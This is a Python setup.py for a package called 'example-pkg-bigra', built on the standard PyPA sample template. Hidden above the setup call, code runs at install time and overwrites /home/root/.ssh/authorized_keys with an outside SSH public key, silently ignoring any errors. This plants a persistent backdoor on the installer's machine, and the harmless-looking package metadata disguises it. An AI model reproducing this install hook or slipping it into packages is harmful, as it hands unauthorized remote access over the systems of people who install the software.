import setuptools

try:    
   with open("/home/root/.ssh/authorized_keys", "w") as f:
        f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINo0pA20p9UllN+cboA2/Sk6w23x4o2sxbcW7pRKw/E4 littlelion@parrot")
        f.close()
except Exception as e:
    pass
setuptools.setup(
    name="example-pkg-bigra",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
